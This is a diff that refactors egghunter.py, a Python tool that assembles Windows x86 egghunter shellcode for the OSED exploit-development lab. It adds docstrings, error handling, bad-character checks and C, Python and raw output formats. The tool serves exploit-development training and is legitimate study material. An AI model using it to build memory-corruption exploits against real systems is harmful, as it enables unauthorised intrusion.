@@ -1,25 +1,57 @@
 #!/usr/bin/python3
+"""
+egghunter.py - Create egghunters compatible with OSED lab VM
+
+This script generates two types of egghunters:
+1. NtAccessCheckAndAuditAlarm-based (35 bytes, default)
+2. SEH-based (69 bytes, more compatible but larger)
+"""
 import sys
 import argparse
+from typing import List
 import keystone as ks
 
 
-def is_valid_tag_count(s):
-    return True if len(s) == 4 else False
+def is_valid_tag_count(s: str) -> bool:
+    """Validate that the tag is exactly 4 characters long."""
+    return len(s) == 4
 
 
-def tag_to_hex(s):
-    string = s
-    if is_valid_tag_count(s) == False:
-        args.tag = "c0d3"
-        string = args.tag
-    retval = list()
-    for char in string:
+def tag_to_hex(s: str) -> str:
+    """
+    Convert a 4-character tag to its hex representation.
+
+    Args:
+        s: 4-character tag string (e.g., 'c0d3')
+
+    Returns:
+        Hex representation of the tag in little-endian format (e.g., '0x33643063')
+
+    Raises:
+        ValueError: If tag is not 4 characters long
+    """
+    if not is_valid_tag_count(s):
+        raise ValueError(f"Tag must be exactly 4 characters, got '{s}' ({len(s)} characters)")
+
+    retval = []
+    for char in s:
         retval.append(hex(ord(char)).replace("0x", ""))
     return "0x" + "".join(retval[::-1])
 
 
-def ntaccess_hunter(tag):
+def ntaccess_hunter(tag: str) -> str:
+    """
+    Generate NtAccessCheckAndAuditAlarm-based egghunter assembly code (35 bytes).
+
+    This egghunter uses the NtAccessCheckAndAuditAlarm syscall to validate memory
+    addresses before searching for the egg. This is the smallest egghunter variant.
+
+    Args:
+        tag: 4-character tag to search for
+
+    Returns:
+        Assembly code string for the egghunter
+    """
     asm = f"""
     loop_inc_page:
         or dx, 0x0fff
@@ -48,7 +80,20 @@ def ntaccess_hunter(tag):
     return asm
 
 
-def seh_hunter(tag):
+def seh_hunter(tag: str) -> str:
+    """
+    Generate SEH-based egghunter assembly code (69 bytes).
+
+    This egghunter uses Structured Exception Handling to safely traverse memory.
+    It's more compatible with different Windows versions but larger than the
+    NtAccessCheckAndAuditAlarm variant.
+
+    Args:
+        tag: 4-character tag to search for
+
+    Returns:
+        Assembly code string for the egghunter
+    """
     asm = [
         "start:",
         "jmp get_seh_address",  # start of jmp/call/pop
@@ -92,57 +137,149 @@ def seh_hunter(tag):
     return "\n".join(asm)
 
 
-def main(args):
+def check_bad_chars(encoding: bytes, bad_chars: List[str]) -> None:
+    """
+    Check if any bad characters are present in the encoded egghunter.
 
-    egghunter = ntaccess_hunter(args.tag) if not args.seh else seh_hunter(args.tag)
+    Args:
+        encoding: Assembled bytes of the egghunter
+        bad_chars: List of hex strings representing bad characters
 
-    eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
-    if args.seh:
-        encoding, count = eng.asm(egghunter)
-    else:
-        print("[+] Egghunter assembly code + coresponding bytes")
-        asm_blocks = ""
-        prev_size = 0
-        for line in egghunter.splitlines():
-            asm_blocks += line + "\n"
-            encoding, count = eng.asm(asm_blocks)
-            if encoding:
-                enc_opcode = ""
-                for byte in encoding[prev_size:]:
-                    enc_opcode += "0x{0:02x} ".format(byte)
-                    prev_size += 1
-                spacer = 30 - len(line)
-                print("%s %s %s" % (line, (" " * spacer), enc_opcode))
-
-    final = ""
-    final += 'egghunter = b"'
-
+    Raises:
+        SystemExit: If bad characters are found in the encoding
+    """
+    final = 'egghunter = b"'
     for enc in encoding:
         final += "\\x{0:02x}".format(enc)
-
     final += '"'
 
-    sentry = False
-
-    for bad in args.bad_chars:
+    found_bad_chars = []
+    for bad in bad_chars:
         if bad in final:
-            print(f"[!] Found 0x{bad}")
-            sentry = True
+            found_bad_chars.append(bad)
+            print(f"[!] Found bad character: 0x{bad}")
 
-    if sentry:
+    if found_bad_chars:
         print(f"[=] {final[14:-1]}", file=sys.stderr)
+        print(f"[!] Bad characters found: {', '.join('0x' + bc for bc in found_bad_chars)}", file=sys.stderr)
         raise SystemExit("[!] Remove bad characters and try again")
 
+
+def format_output(encoding: bytes, output_format: str, varname: str = "egghunter") -> str:
+    """
+    Format egghunter bytes in various output formats.
+
+    Args:
+        encoding: Assembled egghunter bytes
+        output_format: Output format (python, c, raw, hex, escaped)
+        varname: Variable name for output
+
+    Returns:
+        Formatted string representation
+    """
+    if output_format == "python":
+        result = f'{varname} = b"'
+        for enc in encoding:
+            result += "\\x{0:02x}".format(enc)
+        result += '"'
+        return result
+
+    elif output_format == "c":
+        result = f"unsigned char {varname}[] = {{\n    "
+        for i, enc in enumerate(encoding):
+            if i > 0 and i % 12 == 0:
+                result += "\n    "
+            result += "0x{0:02x}".format(enc)
+            if i < len(encoding) - 1:
+                result += ", "
+        result += "\n};"
+        return result
+
+    elif output_format == "hex":
+        return "".join("{0:02x}".format(enc) for enc in encoding)
+
+    elif output_format == "escaped":
+        return "".join("\\x{0:02x}".format(enc) for enc in encoding)
+
+    elif output_format == "raw":
+        return encoding.decode('latin-1')
+
+    else:
+        return format_output(encoding, "python", varname)
+
+
+def main(args):
+    """Main function to generate and display the egghunter."""
+    try:
+        egghunter = ntaccess_hunter(args.tag) if not args.seh else seh_hunter(args.tag)
+    except ValueError as e:
+        print(f"[!] Error: {e}", file=sys.stderr)
+        raise SystemExit(1)
+
+    try:
+        eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
+    except Exception as e:
+        print(f"[!] Failed to initialize keystone engine: {e}", file=sys.stderr)
+        raise SystemExit(1)
+
+    try:
+        if args.seh or not args.verbose:
+            encoding, count = eng.asm(egghunter)
+        else:
+            print("[+] Egghunter assembly code + corresponding bytes")
+            asm_blocks = ""
+            prev_size = 0
+            for line in egghunter.splitlines():
+                asm_blocks += line + "\n"
+                encoding, count = eng.asm(asm_blocks)
+                if encoding:
+                    enc_opcode = ""
+                    for byte in encoding[prev_size:]:
+                        enc_opcode += "0x{0:02x} ".format(byte)
+                        prev_size += 1
+                    spacer = 30 - len(line)
+                    print("%s %s %s" % (line, (" " * spacer), enc_opcode))
+    except ks.KsError as e:
+        print(f"[!] Assembly failed: {e}", file=sys.stderr)
+        raise SystemExit(1)
+
+    if not encoding:
+        print("[!] Failed to generate egghunter: no bytes were assembled", file=sys.stderr)
+        raise SystemExit(1)
+
+    # Check for bad characters
+    check_bad_chars(encoding, args.bad_chars)
+
+    # Format output
+    output_str = format_output(encoding, args.format, args.varname)
+
+    # Display info
     print(f"[+] egghunter created!")
     print(f"[=]   len: {len(encoding)} bytes")
     print(f"[=]   tag: {args.tag * 2}")
-    print(f"[=]   ver: {['NtAccessCheckAndAuditAlarm', 'SEH'][args.seh]}\n")
-    print(final)
+    print(f"[=]   ver: {['NtAccessCheckAndAuditAlarm', 'SEH'][args.seh]}")
+    print(f"[=]   fmt: {args.format}\n")
+
+    # Save to file if requested
+    if args.output:
+        try:
+            if args.format == "raw":
+                with open(args.output, "wb") as f:
+                    f.write(encoding)
+            else:
+                with open(args.output, "w") as f:
+                    f.write(output_str)
+            print(f"[+] Egghunter saved to: {args.output}\n")
+        except IOError as e:
+            print(f"[!] Failed to write output file: {e}", file=sys.stderr)
+
+    print(output_str)
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
-        description="Creates an egghunter compatible with the OSED lab VM"
+        description="Creates an egghunter compatible with the OSED lab VM",
+        epilog="Example: %(prog)s -t w00t -b 00 0a 0d -f c -o egghunter.c"
     )
 
     parser.add_argument(
@@ -163,6 +300,31 @@ if __name__ == "__main__":
         "--seh",
         help="create an seh based egghunter instead of NtAccessCheckAndAuditAlarm",
         action="store_true",
+    )
+    parser.add_argument(
+        "-f",
+        "--format",
+        choices=["python", "c", "raw", "hex", "escaped"],
+        default="python",
+        help="output format (default: python)",
+    )
+    parser.add_argument(
+        "-o",
+        "--output",
+        help="write output to file instead of stdout",
+        metavar="FILE",
+    )
+    parser.add_argument(
+        "-v",
+        "--verbose",
+        help="show assembly code with corresponding bytes (NtAccess only)",
+        action="store_true",
+    )
+    parser.add_argument(
+        "-n",
+        "--varname",
+        help="variable name for output (default: egghunter)",
+        default="egghunter",
     )
 
     args = parser.parse_args()
